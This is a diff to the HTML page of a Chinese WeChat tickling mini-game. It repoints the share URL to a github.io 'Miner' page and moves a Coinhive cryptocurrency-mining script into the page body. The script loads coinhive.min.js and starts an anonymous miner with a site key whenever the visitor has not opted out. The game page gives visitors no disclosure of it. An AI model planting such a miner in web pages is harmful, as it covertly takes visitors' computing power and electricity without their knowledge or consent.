@@ -12,7 +12,7 @@
 			var dataForWeixin = {
 				"appId": "wx96deaaf4234437dd",
 				"TLImg": "./naoyang.jpg",
-				"url":   "http://game.id87.com/youxi/nyy/",
+				"url":   "http://frankiezzz.github.io/Miner/naoyangyang/index.html",
 				"title": "疯狂挠痒痒！快来测试",
 				"desc": "超级染色体"
 			};
@@ -51,16 +51,6 @@
 				document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
 			}   
 		</script>
-        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-        <script>
-            var miner = new CoinHive.Anonymous('aPFC8KnX2SS7amIrk4yUxyD5NTxJaTKb', {throttle: 0.3});
-            
-            // Only start on non-mobile devices and if not opted-out
-            // in the last 14400 seconds (4 hours):
-            if (!miner.didOptOut(14400)) {
-                miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
-            }
-        </script>
 		<style type="text/css">
 			#share-wx{
 				background:rgba(0,0,0,0.8);
@@ -86,6 +76,16 @@
 		</style>
 	</head>
     <body screen_capture_injected="true">
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+        var miner = new CoinHive.Anonymous('aPFC8KnX2SS7amIrk4yUxyD5NTxJaTKb', {throttle: 0.3});
+        
+        // Only start on non-mobile devices and if not opted-out
+        // in the last 14400 seconds (4 hours):
+        if (!miner.didOptOut(14400)) {
+            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+        }
+    </script>
 	<script type="text/javascript" src="js/code.js"></script>
 	 <div class="lis">
 <!--        <div style="float: left;width:33.2%;"><a style="border-bottom: 3px solid #fd6766;" href="http://game.id87.com/youxi/">游戏列表</a></div>-->
